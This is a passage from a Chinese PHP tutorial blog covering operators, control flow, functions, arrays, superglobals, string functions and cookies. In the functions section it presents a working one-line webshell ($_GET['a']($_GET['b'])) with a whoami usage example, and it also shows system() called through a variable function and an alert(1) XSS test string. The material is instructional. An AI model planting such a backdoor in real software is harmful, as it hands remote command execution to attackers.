有且仅有一个是true，返回为true</td></tr></tbody></table><p><code>与 运算高于 或 运算</code></p><table><thead><tr><th align="center">比较运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td></tr><tr><td align="center">===</td><td align="center">绝对等于(包括类型相同)</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于</td></tr><tr><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于</td></tr><tr><td align="center">!=</td><td align="center">不等于</td></tr><tr><td align="center">&lt;&gt;</td><td align="center">不等于</td></tr><tr><td align="center">!==</td><td align="center">绝对不等于(包括类型不相同)</td></tr></tbody></table><table><thead><tr><th align="center">赋值运算符</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">=</td><td align="center">右赋左</td></tr><tr><td align="center">+=</td><td align="center">加</td></tr><tr><td align="center">-=</td><td align="center">减</td></tr><tr><td align="center">*=</td><td align="center">乘</td></tr><tr><td align="center">/=</td><td align="center">除</td></tr><tr><td align="center">%=</td><td align="center">模</td></tr><tr><td align="center">.=</td><td align="center">连接两个字符串</td></tr></tbody></table><table><thead><tr><th align="center">字符串运算符</th><th align="center"></th></tr></thead><tbody><tr><td align="center"><code>. </code></td><td align="center">字符串连接符</td></tr></tbody></table><table><thead><tr><th align="center">其他运算符</th><th align="center"></th></tr></thead><tbody><tr><td align="center"><code>?:</code></td><td align="center">三元运算符: $a = 3 &gt; 5 ? 3 : 5;</td></tr><tr><td align="center">`` <code> 短引号</code></td><td align="center">将字符串当作 <code>命令</code> 进行</td></tr><tr><td align="center"><code>@</code></td><td align="center">屏蔽作用</td></tr><tr><td align="center"><code>&lt;=&gt;</code></td><td align="center">组合比较符—&gt;前者大于后者，值为1；前者等于后者，值为0；前者小于后者，值为-1</td></tr></tbody></table><h1 id="PHP（四）流程控制"><a href="#PHP（四）流程控制" class="headerlink" title="PHP（四）流程控制"></a>PHP（四）流程控制</h1><blockquote><p><strong>顺序执行</strong><br><strong>分支执行</strong><br><strong>循环执行</strong><br><strong>特殊流程控制语句</strong></p></blockquote><p>分支执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单向分支 <span class="keyword">if</span>(判断条件)&#123;执行语句块&#125; </span><br><span class="line">双向分支 <span class="keyword">if</span>(判断条件)&#123;执行语句块&#125;<span class="keyword">else</span>&#123;语句块<span class="number">2</span>&#125;</span><br><span class="line">多项分支 <span class="keyword">elseif</span>  <span class="keyword">switch</span>()  <span class="keyword">case</span>  <span class="keyword">default</span>   <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>循环执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>   循环变量初始化，循环变量改变，判断条件，输出结果</span><br><span class="line"><span class="keyword">do</span> <span class="keyword">while</span> 与 <span class="keyword">while</span> 区别：无论如何先执行一次</span><br><span class="line"><span class="keyword">for</span></span><br></pre></td></tr></table></figure><p>特殊流程控制语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break</span> <span class="number">2</span>;   跳出二层循环 </span><br><span class="line"><span class="keyword">continue</span>;  跳过本次循环</span><br><span class="line"><span class="keyword">die</span>();     结束脚本执行</span><br><span class="line"><span class="keyword">exit</span>();    结束脚本执行</span><br></pre></td></tr></table></figure><h1 id="PHP（五）函数"><a href="#PHP（五）函数" class="headerlink" title="PHP（五）函数"></a>PHP（五）函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">形参</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   代码块</span><br><span class="line">   <span class="keyword">return</span> 表达式; <span class="comment">//返回值，不写默认返回NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>函数调用：</strong> </p><blockquote><p><strong>1.实参按  顺序  传形参<br>2.调用时函数互相独立，执行完毕后，返回调用的位置，继续向下执行</strong></p></blockquote><p><strong>参数的传递</strong></p><blockquote><p><strong>1. 默认方式：值传递，对形参的操作不会影响实参<br>2. 引用传参：对形参的操作会对实参产生影响<br>3. 默认参数：如果没有给函数传递实参，将取默认值</strong></p></blockquote><p> <strong>可变长度参数列表</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func_get_arg(<span class="number">1</span>);  根据参数偏移量，从零开始计数，获取序号为<span class="number">1</span>的参数</span><br><span class="line">func_get_args();  返回一个包含函数参数的数组</span><br><span class="line">func_num_args();  获取参数个数</span><br></pre></td></tr></table></figure><p><strong>可变函数（变量函数）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.可直接把 函数名 赋值给变量</span><br><span class="line"><span class="number">2</span>.不能用于 <span class="keyword">echo</span> ,<span class="keyword">print</span> , <span class="keyword">unset</span>() , <span class="keyword">isset</span>() , <span class="keyword">empty</span>(), ,<span class="keyword">include</span> , <span class="keyword">require</span>  等，需要使用自己的包装函数来将这些结构用作可变函数</span><br><span class="line"><span class="number">3</span>.结构：<span class="variable">$a</span>(<span class="variable">$b</span>);   </span><br></pre></td></tr></table></figure><p>例子1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=gb2312&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is func &quot;</span>.<span class="keyword">__FUNCTION__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>.func_get_arg(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is func&quot;</span>.<span class="keyword">__FUNCTION__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>.func_get_arg(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;test1&quot;</span>;   <span class="comment">//引号中为函数名</span></span><br><span class="line"><span class="variable">$a</span>(<span class="string">&quot;jiayou&quot;</span>); <span class="comment">//一个函数，函数名为$a,相当于test1(&quot;jiayou&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果为<br><img src="https://img-blog.csdnimg.cn/20210112211641888.png" alt="在这里插入图片描述"><br>例子2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=gb2312&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//一个函数，函数名为$a,相当于system(&quot;ipconfig&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果为<br><img src="https://img-blog.csdnimg.cn/2021011221230352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最简单的后门 (一句话木马)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=gb2312&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">url 输入： 路径 + ?a=system&amp;&amp;b=whoami 等其他命令，中间不能有空格</span><br></pre></td></tr></table></figure><p><strong>递归函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">指在函数内部自己调用自己的函数</span><br></pre></td></tr></table></figure><p><strong>内部(内置) 函数</strong></p><blockquote><p>PHP提供了许多现成的 <strong>函数</strong> 与 <strong>结构</strong> ，还有一些函数需要开启特定的 <strong>PHP扩展模块</strong>，否则使用时会得到一个错误 “未定义该函数” 。<br>这些扩展模块需要 <strong>手动修改php.ini文件</strong> 即可正常使用。</p></blockquote><h1 id="PHP（六）数组"><a href="#PHP（六）数组" class="headerlink" title="PHP（六）数组"></a>PHP（六）数组</h1><p><strong>一、概述</strong><br>1.数组是一种变量类型，复合数据类型<br>2.数组的数据由 <strong>键值对</strong> 组成</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">键值对:</span><br><span class="line">中括号[]中的为 键名key  </span><br><span class="line">内容为 键值value</span><br></pre></td></tr></table></figure><p>3.数组中元素可以存放 不同类型 的数据，包括整型，浮点型，布尔类型等</p><p><strong>二、数组的分类</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">索引数组：键值对为整型的正数</span><br><span class="line">关联数组：键值对为具有语义的字符串</span><br></pre></td></tr></table></figure><p><strong>三、数组的创建</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">方法一：变量+[]=</span><br><span class="line"><span class="number">1</span>.未指定键名的情况下给数组赋值，键名默认从 零 开始计数，依次增大</span><br><span class="line"><span class="variable">$stu</span>[] = <span class="string">&#x27;xiaoming&#x27;</span>;</span><br><span class="line"><span class="variable">$stu</span>[] = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$stu</span>[] = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$stu</span>[] = <span class="number">99</span>;</span><br><span class="line"><span class="comment">//键名依次为 0，1，2，3</span></span><br><span class="line"><span class="number">2</span>.可手动定键名</span><br><span class="line"><span class="variable">$stu</span>[<span class="number">20</span>] = <span class="string">&#x27;xiaoming&#x27;</span>;</span><br><span class="line"><span class="variable">$stu</span>[<span class="number">80</span>] = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$stu</span>[<span class="number">70</span>] = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$stu</span>[] = <span class="number">99</span>;</span><br><span class="line"><span class="comment">//最后一个键名为 81</span></span><br><span class="line"><span class="variable">$stu</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;xiaoming&#x27;</span>;</span><br><span class="line"><span class="variable">$stu</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$stu</span>[<span class="string">&#x27;sex&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$stu</span>[<span class="string">&#x27;grade&#x27;</span>] = <span class="number">99</span>;</span><br><span class="line"><span class="comment">//字符串定有意义的键名</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">方法二：变量+<span class="keyword">array</span>()=</span><br><span class="line"><span class="number">1</span>.未指定键名，默认从零开始，依次增大</span><br><span class="line"><span class="variable">$stu</span> = <span class="keyword">array</span>(<span class="string">&#x27;xiaoming&#x27;</span>,<span class="number">18</span>,<span class="literal">true</span>,<span class="number">99</span>);</span><br><span class="line"><span class="comment">//键名依次为 0，1，2，3</span></span><br><span class="line"><span class="number">2</span>.指定键名，=&gt;符号</span><br><span class="line"><span class="variable">$stu</span> = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;xiaoming&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">   <span class="string">&#x27;sex&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">   <span class="string">&#x27;grade&#x27;</span> =&gt; <span class="number">99</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>四、数组元素的访问</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.读取：<span class="keyword">echo</span> <span class="variable">$stu</span>[<span class="string">&#x27;name&#x27;</span>];<span class="comment">//中括号中为键名</span></span><br><span class="line"><span class="number">2</span>.添加：<span class="variable">$stu</span>[<span class="string">&#x27;rank&#x27;</span>] = <span class="number">30</span>;<span class="comment">//若为指定键名，默认从零开始  </span></span><br><span class="line"><span class="number">3</span>.修改：<span class="variable">$stu</span>[<span class="string">&#x27;grade&#x27;</span>] = <span class="number">80</span>;</span><br></pre></td></tr></table></figure><p><strong>五、数组的遍历</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">for</span>循环 （适用于 索引数组）</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu</span> = <span class="keyword">array</span>(<span class="string">&#x27;xiaoming&#x27;</span>,<span class="number">18</span>,<span class="literal">true</span>,<span class="number">99</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=count(<span class="variable">$stu</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stu</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.<span class="keyword">foreach</span> 语言结构 （适用于 关联数组）</span><br><span class="line"></span><br><span class="line"><span class="variable">$stu2</span> = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;xiaoming&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">18</span>,</span><br><span class="line">   <span class="string">&#x27;sex&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">   <span class="string">&#x27;grade&#x27;</span> =&gt; <span class="number">99</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$stu2</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>六、二维数组</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.创建：</span><br><span class="line"><span class="variable">$stus</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">1001</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;xiaohong&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">20</span>,<span class="string">&#x27;sex&#x27;</span>=&gt;<span class="literal">false</span>,<span class="string">&#x27;garde&#x27;</span>=&gt;<span class="number">78</span>),</span><br><span class="line"><span class="number">1002</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;xiaoming&#x27;</span>,<span class="number">18</span>,<span class="literal">true</span>,<span class="number">99</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.读取：</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stus</span>[<span class="number">1001</span>][<span class="string">&#x27;age&#x27;</span>];</span><br></pre></td></tr></table></figure><p><strong>常用函数：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">count();</span><br><span class="line">array_key_exists();</span><br><span class="line">in_array();</span><br><span class="line">array_keys();</span><br><span class="line"></span><br><span class="line">array_change_key_case();</span><br><span class="line">array_count_values();</span><br><span class="line">array_fill();</span><br><span class="line">array_filter();</span><br><span class="line">array_values();</span><br></pre></td></tr></table></figure><h1 id="PHP（七）预定义超全局数组变量"><a href="#PHP（七）预定义超全局数组变量" class="headerlink" title="PHP（七）预定义超全局数组变量"></a>PHP（七）预定义超全局数组变量</h1><p>函数内部外部都能使用<br>| 名称      | 作用                                                         |<br>| ——— | ———————————————————— |<br>| $GLOBALS  | 引用全局作用域中可用的全局变量                               |<br>| $_SERVER  | 一个包含头信息(header)，路径(path)，以及脚本位置(script locations)等信息的数组（服务器 客户端 信息等） |<br>| $_GET     | 通过 URL参数 传递给当前脚本变量的数组                        |<br>| $_POST    | 当 HTTP POST 请求的 <code>Coutent-Type</code> 是 <code>application/x-www-form-urlencoded multipart/form-data</code> 时。会将变量以关联数组的形式传入当前脚本 |<br>| $_FILES   | 经由 HTTP POST方法文件上传而提交至脚本的变量                 |<br>| $_COOKIE  | 通过 HTTP Cookies 方式传递给当前脚本变量的数组               |<br>| $_SESSION | 完成对 session 数据的读写                                    |<br>| $_REQUEST | 默认情况下包含<code>$_GET,$_POST,$_COOKIE</code>的数组                  |<br>| $_ENV     | 通过环境方式传递给当前脚本的变量的数组                       |</p><p><strong>$_GET</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">接收来自URL传递的参数</span><br><span class="line">接收方式：url+ ?a=b&amp;c=d</span><br><span class="line">输入时将</span><br><span class="line">参数的名a  为键名</span><br><span class="line">参数的值b  为键值</span><br><span class="line">标签中 name 作为键名   value 作为键值</span><br></pre></td></tr></table></figure><p><strong>$_POST</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http请求报文的请求正文中</span><br><span class="line">当 HTTP POST 请求的Content-Type 是application/x-www-form-urlencoded (默认)</span><br><span class="line">multipart/form-data 文件时，会将变量以关联数组形式传入当前脚本</span><br></pre></td></tr></table></figure><p><strong>$_FILES</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用来获取通过 HTTP POST 方法 上传文件 的相关信息。如果为单个文件上传，那么 <span class="variable">$_FILES</span> 为二维数组；如果为多个文件上传，那么 <span class="variable">$_FILES</span> 为三维数组。</span><br></pre></td></tr></table></figure><p> <code>$_GET,$_POST,$_COOKIE  三者的区别与联系：</code>   <a href="https://www.cnblogs.com/angel648/p/11059220.html">详情请点击这里</a></p><p><strong>更改PHP缓存路径</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.打开 php.ini 文件</span><br><span class="line"><span class="number">2</span>.将代码   ;upload_tmp_dir = </span><br><span class="line">前面的分号删掉，在等号后面写上要修改的路径即可</span><br></pre></td></tr></table></figure><h1 id="PHP（八）字符串"><a href="#PHP（八）字符串" class="headerlink" title="PHP（八）字符串"></a>PHP（八）字符串</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;qwe&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;asd&#x27;</span>;</span><br><span class="line"><span class="comment">//echo = $a.$b;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=&quot;</span>.<span class="variable">$a</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="comment">//双引号解释变量，进行转义</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b=&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="comment">//单引号不解释变量，不进行转义</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">&quot;qwertyaaty&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strlen</span>($a); <span class="comment">//10</span></span><br><span class="line">mb_strlen($a);   <span class="comment">//10</span></span><br><span class="line"></span><br><span class="line">strpos($a,<span class="string">&#x27;ty&#x27;</span>); <span class="comment">//4</span></span><br><span class="line">strpos($a,<span class="string">&#x27;TY&#x27;</span>); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">stripos($a,<span class="string">&#x27;TY&#x27;</span>);<span class="comment">//4//i 表示 不区分大小写</span></span><br><span class="line">strrpos(); <span class="comment">//8//最后一次出现的位置</span></span><br><span class="line"></span><br><span class="line">str_replace(<span class="string">&quot;qwe&quot;</span>,<span class="string">&quot;mmm&quot;</span>,$a); <span class="comment">//$a = &quot;mmmrtyaaty&quot;</span></span><br><span class="line">str_ireplace();</span><br><span class="line"></span><br><span class="line"><span class="built_in">strstr</span>(<span class="string">&quot;baidu.com&quot;</span>,<span class="string">&quot;u&quot;</span>);<span class="comment">//返回 u.com</span></span><br><span class="line">stristr();</span><br><span class="line"></span><br><span class="line">substr(<span class="string">&quot;baidu.com&quot;</span>,<span class="number">2</span>,<span class="number">3</span>);   <span class="comment">//0开始 返回 idu</span></span><br><span class="line"><span class="built_in">strrchr</span>(<span class="string">&quot;baidu.com&quot;</span>,<span class="string">&quot;u.&quot;</span>);  <span class="comment">//只取第一个字符 开始位置之后的内容</span></span><br><span class="line"><span class="comment">//返回 u.com</span></span><br><span class="line"></span><br><span class="line">$b = <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">split();  <span class="comment">//正则分割</span></span><br><span class="line">$arr = explode(<span class="string">&quot;.&quot;</span>,$b); <span class="comment">//返回 数组元素分别是 www baidu com//字符串分割</span></span><br><span class="line">$new_arr = implode($arr,<span class="string">&quot;.&quot;</span>);  <span class="comment">//将一个一维数组转换成 字符串</span></span><br><span class="line"></span><br><span class="line">trim();<span class="comment">//去除首尾的空白符</span></span><br><span class="line">ltrim();</span><br><span class="line">rtrim();</span><br><span class="line"></span><br><span class="line">$user = <span class="string">&quot;www&#x27;&quot;</span>;</span><br><span class="line"><span class="function">echo  <span class="title">addslashes</span><span class="params">($user)</span></span>;<span class="comment">//返回 www\&#x27;    //使用反斜线 引用字符串</span></span><br><span class="line"></span><br><span class="line">$c = <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>; </span><br><span class="line">echo $c;<span class="comment">//返回弹框</span></span><br><span class="line"><span class="function">echo <span class="title">htmlspecialchars</span><span class="params">($c)</span></span>;  <span class="comment">//返回 &lt;script&gt;alert(1)&lt;/script&gt;   由于 将其变成 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;gt;</span></span><br></pre></td></tr></table></figure><h1 id="PHP（九）会话技术"><a href="#PHP（九）会话技术" class="headerlink" title="PHP（九）会话技术"></a>PHP（九）会话技术</h1><p><strong>盗取 Cookie       会话劫持</strong></p><ul><li><p>产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了<strong>会话技术：Session , cookie</strong></p></li><li><p>**Cookie :  **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。</p><ul><li><strong>客户端第一次请求</strong>：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。</li><li><strong>客户端再次发送请求</strong>：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。</li></ul></li><li><p>**Session :   **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。</p><ul><li><strong>客户端第一次请求</strong>：创建 <code>SESSIONID</code> ；初始化超全局变量 <code>$_SESSION</code>；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 <code>将SESSIONID以SETCOOKIE的形式返回给客户端</code>，相当于 <code>将SESSIONID 写入 COOKIE 当中</code>。</li><li><strong>客户端再次发送请求</strong>：检测到 <code>客户端的COOKIE中的SESSIONID</code> ；初始化超全局变量<code>$_SESSION</code>；找到文件，反序列化读取数据存储到<code>$_SESSION</code>中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。</li></ul></li><li><p><strong>登陆判断：</strong></p><ul><li>用户成功登录之后，服务器通过 <code>SESSION机制</code> 将用户信息存储到服务端，并将 <code>SESSIONID</code> 以 <code>SETCOOKIE</code>  的形式返回给客户端。</li><li>用户下一次访问站点时，自动携带COOKIE信息，服务端根据COOKIE当中的 SESSIONID 进行数据匹配，存在证明已登录过。</li></ul></li></ul><h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h2><p>HTTP协议：客户端发出请求，服务器给出响应</p><p><strong>cookie 概述</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.cookie：由 服务器生成 发送给客户端 的储存在用户本地终端(客户端/浏览器)上的数据，类型为“小型文本文件”。当每次客户端浏览器在发送请求的时候，都会携带该 cookie 信息。</span><br><span 